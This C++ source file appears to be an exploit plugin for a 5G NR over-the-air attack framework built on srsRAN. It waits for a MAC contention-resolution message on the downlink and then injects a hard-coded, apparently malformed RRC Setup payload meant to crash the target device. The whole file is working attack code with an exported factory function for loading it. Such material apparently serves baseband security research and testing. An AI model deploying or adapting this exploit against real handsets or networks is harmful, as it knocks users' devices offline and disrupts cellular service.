#include "shadower/hdr/exploit.h"
#include "shadower/hdr/utils.h"
#include "shadower/modules/hdr/rrc_setup_helper.h"
#include "srsran/asn1/asn1_utils.h"
#include "srsran/asn1/rrc_nr.h"
#include "srsran/mac/mac_sch_pdu_nr.h"
#include <iomanip>
#include <sstream>
const uint8_t original_rrc_setup[] = { // 0x3e, 0x17, 0x43, 0x8c, 0x73, 0xc7, 0x50,
    0x00, 0x9f, 0x28, 0x40, 0x04, 0x04, 0x1a, 0xe0, 0x05, 0x80, 0x08, 0x8b, 0xd7, 0x63, 0x80, 0x83, 0x0f, 0x80,
    0x03, 0xe0, 0x10, 0x23, 0x41, 0xe0, 0x40, 0x00, 0x20, 0x90, 0x4c, 0x0c, 0xa8, 0x04, 0x0f, 0xff, 0xf8, 0x00,
    0x00, 0x00, 0x08, 0x00, 0x01, 0xb8, 0xa2, 0x10, 0x00, 0x04, 0x00, 0xb2, 0x80, 0x00, 0x24, 0x10, 0x00, 0x02,
    0x20, 0x67, 0xa0, 0x6a, 0xa4, 0x9a, 0x80, 0x00, 0x20, 0x04, 0x04, 0x00, 0x08, 0x00, 0xd0, 0x10, 0x01, 0x3b,
    0x64, 0xb1, 0x80, 0xee, 0x03, 0xb3, 0xc4, 0xd5, 0xe6, 0x80, 0x00, 0x01, 0x4d, 0x08, 0x01, 0x00, 0x01, 0x2c,
    0x0e, 0x10, 0x41, 0x64, 0xe0, 0xc1, 0x0e, 0x00, 0x1c, 0x4a, 0x07, 0x00, 0x00, 0x08, 0x17, 0xbd, 0x00, 0x40,
    0x00, 0x40, 0x00, 0x01, 0x90, 0x00, 0x50, 0x00, 0xca, 0x81, 0x80, 0x62, 0x20, 0x0a, 0x80, 0x00, 0x00, 0x00,
    0x00, 0xa1, 0x00, 0x40, 0x00, 0x0a, 0x28, 0x40, 0x40, 0x01, 0x63, 0x00};

class RRCSetupCrashExploit : public Exploit
{
public:
  RRCSetupCrashExploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                       SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    rrc_setup_vec = std::make_shared<std::vector<uint8_t> >(sizeof(original_rrc_setup));
    memcpy(rrc_setup_vec->data(), original_rrc_setup, sizeof(original_rrc_setup));
  }

  void setup() override { f_contention_resolution = wd_filter("mac-nr.dlsch.lcid == 0x3e"); }

  void pre_dissection(wd_t* wd) override { wd_register_filter(wd, f_contention_resolution); }

  void post_dissection(wd_t*                 wd,
                       uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (direction == DL) {
      if (wd_read_filter(wd, f_contention_resolution)) {
        logger.info(YELLOW "Received contention resolution" RESET);
        dl_buffer_queue.push(rrc_setup_vec);
        return;
      }
    }
  }

private:
  wd_filter_t                            f_contention_resolution;
  std::shared_ptr<std::vector<uint8_t> > rrc_setup_vec;
  srsran::mac_sch_pdu_nr                 rrc_setup_mac_pdu;
  std::vector<uint8_t>                   modified_dl_ccch_msg;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new RRCSetupCrashExploit(dl_buffer_queue_, ul_buffer_queue_);
}
}